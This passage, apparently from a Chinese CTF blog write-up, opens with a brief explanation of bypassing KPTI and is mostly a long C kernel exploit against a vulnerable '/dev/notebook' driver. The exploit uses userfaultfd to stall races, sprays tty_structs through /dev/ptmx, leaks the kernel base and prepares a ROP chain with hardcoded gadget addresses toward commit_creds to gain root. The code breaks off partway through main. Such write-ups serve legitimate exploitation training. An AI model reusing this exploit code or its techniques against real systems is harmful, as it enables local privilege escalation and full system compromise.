id="4）KPTI-bypass"><a href="#4）KPTI-bypass" class="headerlink" title="4）KPTI bypass"></a>4）KPTI bypass</h4><p>由于开启了 KPTI（内核页表隔离），故我们在返回用户态之前还需要将我们的用户进程的页表给切换回来</p><p>在这里直接使用内核用于完成内核态到用户态切换的函数 <code>swapgs_restore_regs_and_return_to_usermode</code>，地址可以在 <code>/proc/kallsyms</code> 中获得</p><p>布置出如下栈布局即可</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs AWK">↓    swapgs_restore_regs_and_return_to_usermode<br>    <span class="hljs-number">0</span> <span class="hljs-regexp">//</span> padding<br>    <span class="hljs-number">0</span> <span class="hljs-regexp">//</span> padding<br>    user_shell_addr<br>    user_cs<br>    user_rflags<br>    user_sp<br>    user_ss<br></code></pre></div></td></tr></table></figure><p>最终的 exp 如下：</p><blockquote><p>exp.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a00929</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET 0xffffffff81238d50</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RSP_RBP_POP_RBP_RET 0xffffffff8107875c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDI_RET 0xffffffff81007115</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RDI_RAX_POP_RBP_RET 0xffffffff81045833 <span class="hljs-comment">// mov rdi, rax; xor eax, eax; cmp rdi, 0x9000000; je 0x245843; pop rbp; ret;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDX_RET 0xffffffff81358842</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> RET 0xffffffff81000091</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff810637d4</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IRETQ 0xffffffff810338bb</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDX_POP_R12_POP_RBP_RET 0xffffffff810880c1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RSI_POP_RDI_POP_RBX_RET 0xffffffff81079c38</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RBP_RET 0xffffffff81000367</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RBX_POP_RBP_RET 0xffffffff81002141</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RAX_POP_RBX_POP_RBP_RET 0xffffffff810cadf7</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> page_size;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">sem_t</span> sem_add, sem_edit;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> * buf; <span class="hljs-comment">// for userfaultfd</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        sleep(<span class="hljs-number">100</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">long</span> note_fd;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> idx;<br>    <span class="hljs-keyword">size_t</span> size;<br>    <span class="hljs-keyword">char</span> * buf;<br>&#125; Note;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteAdd</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteAddWrapper</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    noteAdd(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteDel</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x200</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteEdit</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x300</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteEditWrapper</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    noteEdit(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteGift</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">evilAdd</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    sem_wait(&amp;sem_add);<br>    noteAdd((<span class="hljs-keyword">int</span>)args, <span class="hljs-number">0x50</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">evilEdit</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    sem_wait(&amp;sem_edit);<br>    noteEdit((<span class="hljs-keyword">int</span>)args, <span class="hljs-number">0x2000</span>, buf);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">void</span> * buf;<br>    <span class="hljs-keyword">size_t</span> size;<br>&#125; notebook[<span class="hljs-number">0x10</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv, <span class="hljs-keyword">char</span> ** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> tty_fd[<span class="hljs-number">0x100</span>], tty_idx, fake_tty_ops_idx = <span class="hljs-number">-1</span>, fake_stack_idx = <span class="hljs-number">-1</span>, hit_tty = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">size_t</span> tty_data[<span class="hljs-number">0x200</span>], fake_tty_data[<span class="hljs-number">0x200</span>], tty_ops, fake_tty_ops_data[<span class="hljs-number">0x200</span>], rop[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-keyword">pthread_t</span> <span class="hljs-keyword">tmp_t</span>, <span class="hljs-keyword">add_t</span>, <span class="hljs-keyword">edit_t</span>;<br>    Note note;<br><br>    saveStatus();<br>    sem_init(&amp;sem_add, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    sem_init(&amp;sem_edit, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    note_fd = open(<span class="hljs-string">&quot;/dev/notebook&quot;</span>, O_RDWR);<br>    buf = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">strcpy</span>(page, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    <span class="hljs-comment">// register userfaultfd</span><br>    registerUserFaultFd(buf, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br><br>    <span class="hljs-comment">// initialize the notebook</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        noteAdd(i, <span class="hljs-number">0x20</span>, page);<br>        noteEdit(i, TTY_STRUCT_SIZE, page);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Notebook initialization done.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// get all the note free and get the threads stuck by userfaultfd to save their ptrs</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        pthread_create(&amp;<span class="hljs-keyword">edit_t</span>, <span class="hljs-literal">NULL</span>, evilEdit, (<span class="hljs-keyword">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Edit threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_edit);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Edit threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// heap spraying to hit the tty_struct</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        tty_fd[i] = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Heap spray for tty done.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// change the size stored in notebook to pass _check_object_size and get the threads stuck by userfaultfd to save the ptrs</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        pthread_create(&amp;<span class="hljs-keyword">add_t</span>, <span class="hljs-literal">NULL</span>, evilAdd, (<span class="hljs-keyword">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Add threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_add);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Add threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// check whether we&#x27;ve hit the tty_struct</span><br>    noteGift((<span class="hljs-keyword">char</span>*) notebook);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (hit_tty = (*((<span class="hljs-keyword">int</span>*)tty_data) == <span class="hljs-number">0x5401</span>))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully hit the tty_struct at idx \033[0m%d.\n&quot;</span>, tty_idx = i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the tty_struct: \033[0m%p.\n&quot;</span>, notebook[i].buf);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!hit_tty)<br>        errExit(<span class="hljs-string">&quot;Failed to hit the tty struct.&quot;</span>);<br><br>    <span class="hljs-comment">// get kernel base</span><br>    tty_ops = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)(tty_data + <span class="hljs-number">3</span>);<br>    kernel_offset = ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);<br>    kernel_base = (<span class="hljs-keyword">void</span>*) ((<span class="hljs-keyword">size_t</span>)kernel_base + kernel_offset);<br>    prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m%p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] prepare_kernel_cred: \033[0m%p\n&quot;</span>, prepare_kernel_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] commit_creds: \033[0m%p\n&quot;</span>, commit_creds);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] swapgs_restore_regs_and_return_to_usermode: \033[0m%p\n&quot;</span>, SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset);<br><br>    <span class="hljs-comment">// find available note as fake tty_ops and fake stack</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (*((<span class="hljs-keyword">int</span>*)tty_data) != <span class="hljs-number">0x5401</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake tty_operations at idx \033[0m%d.\n&quot;</span>, fake_tty_ops_idx = i);<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake stack at idx \033[0m%d.\n&quot;</span>, fake_stack_idx = i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span> || fake_stack_idx == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;Unable to find enough available notes, you\&#x27;re so lucky that you got so many tty_structs.&quot;</span>);<br><br>    <span class="hljs-comment">// adjust the size of the object</span><br>    noteEdit(fake_tty_ops_idx, <span class="hljs-keyword">sizeof</span>(struct tty_operations), fake_tty_data);<br>    noteEdit(fake_stack_idx, <span class="hljs-number">0x100</span>, rop);<br>    noteGift((<span class="hljs-keyword">char</span>*) notebook);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake tty_operations: \033[0m%p.\n&quot;</span>, notebook[fake_tty_ops_idx].buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake stack: \033[0m%p.\n&quot;</span>, notebook[fake_stack_idx].buf);<br><br>    <span class="hljs-comment">// restore tty_struct data</span><br>    read(note_fd, tty_data, tty_idx);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, 